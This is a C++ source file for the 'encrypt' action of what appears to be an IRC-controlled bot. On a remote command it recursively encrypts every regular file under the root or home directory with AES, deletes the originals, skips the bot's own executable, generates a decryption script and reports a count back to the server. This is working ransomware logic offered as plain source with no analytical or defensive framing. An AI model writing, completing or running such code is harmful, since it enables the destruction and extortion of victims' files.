#include "EncryptAction.hpp"

bool isValidEncAlgorithm(const char* cString) {
    if (GeneralUtils::cStrAreEqual(cString, "AES-128")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "AES-192")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "AES-256")) {
        return true;
    }
    return false;
}

bool isValidStartDir(const char* cString) {
    if (GeneralUtils::cStrAreEqual(cString, "ROOT")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "HOME")) {
        return true;
    }
    return false;
}

bool isValidCryptoType(const char* cString) {
    if (GeneralUtils::cStrAreEqual(cString, "DEC")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "ENC")) {
        return true;
    }
    return false;
}

bool isNotBotFile(std::string fileName) {
    const char* basename = GeneralUtils::getFileBaseName(fileName);
    return !GeneralUtils::cStrAreEqual(basename, "irc_bot"); // TEMP: pass exe name to this file
}

std::string getParentDirectory(const std::string& path) {
    size_t pos = path.find_last_of("/\\");
    if (pos == std::string::npos || pos == 0) {
        return path;
    }
    return path.substr(0, pos);
}


EncryptAction::EncryptAction(std::vector<std::string> actionParams) 
    : actionParams(actionParams) {
    this->msgToServer = "";
    this->checkParams();
}

ActionType EncryptAction::getActionType() {
    return ActionType::ENCRYPT;
}

std::string EncryptAction::getMessage() {
    return msgToServer;
}

void EncryptAction::execute() { 
    if (!isValid) {
        return;
    }
    const char* algo = actionParams[ALGO_IDX].c_str();
    this->isDecryption = GeneralUtils::cStrAreEqual(actionParams[CRYPTO_TYPE_IDX].c_str(), "DEC");
    fs::path startDir = determineStartDir(actionParams[START_DIR_IDX].c_str());
    CryptoManager newCryptoManager(algo);

    std::string result = traverseFileSystem(startDir, newCryptoManager);
    if (!isDecryption) {
        GenDecryptionScript::generateScript();
    }
    this->msgToServer = result;
    printf("ENCRYPT ACTION Result: %s\n", result.c_str());
}

std::string EncryptAction::determineStartDir(const char* cString) {
    if (GeneralUtils::cStrAreEqual(cString, "ROOT")) {
        return std::string("/");
    } else {
        return std::string("/home");
    }
}

std::string EncryptAction::traverseFileSystem(const fs::path& startDir, CryptoManager cryptoManager) {
    try {
        if (!fs::exists(startDir) || !fs::is_directory(startDir)) {
            return ERROR_MSG;
        } 
    } catch (const fs::filesystem_error& e) {
        return ERROR_MSG;
    } catch (const std::exception& e) {
        return ERROR_MSG;
    }

    int count = 0;
    for (const auto& entry : fs::recursive_directory_iterator(startDir, fs::directory_options::skip_permission_denied)) {
        try {
            if (fs::is_regular_file(entry.status())) {
                if (isNotBotFile(entry.path().string())) {
                    printf("Filename: %s\n", entry.path().c_str());
                    try {
                        if (isDecryption) {
                            if (entry.path().extension() == ".cry") {
                                cryptoManager.decryptFile(entry.path().string());
                                fs::remove(entry.path());
                                count++;
                            }
                        } else {
                            if (entry.path().extension() != ".cry") { // TODO: find better way of not double-encrypting files
                                cryptoManager.encryptFile(entry.path().string());
                                fs::remove(entry.path());
                                count++;
                            }
                        }
                    } catch (const std::exception& e) {
                        continue;
                    }
                }
            }
        } catch (const fs::filesystem_error& e) {
            continue;
        } catch (const std::exception& e) {
            continue;
        }
    }
    std::ostringstream oss;
    if (isDecryption) {
        oss << count << " file(s) decrypted";
    } else {
        oss << count << " file(s) encrypted";
    }
    return oss.str();
} 

/*
    ENCRYPT Command Syntax:
        ENCRYPT <ENC_ALGORITHM> <ROOT|HOME> <ENC|DEC>
*/
void EncryptAction::checkParams() {
    if (actionParams.size() - 3 != PARAM_COUNT) {
        isValid = false;
        return;
    }

    if (!GeneralUtils::cStrAreEqual(actionParams[COMMAND_TYPE_IDX].c_str(), "ENCRYPT")) {
        isValid = false;
        return;
    }

    if(!isValidEncAlgorithm(actionParams[ALGO_IDX].c_str())) {
        isValid = false;
        return;
    }

    if(!isValidStartDir(actionParams[START_DIR_IDX].c_str())) {
        isValid = false;
        return;
    }

    if (!isValidCryptoType(actionParams[CRYPTO_TYPE_IDX].c_str())) {
        isValid = false;
        return;
    }

    isValid = true;
}
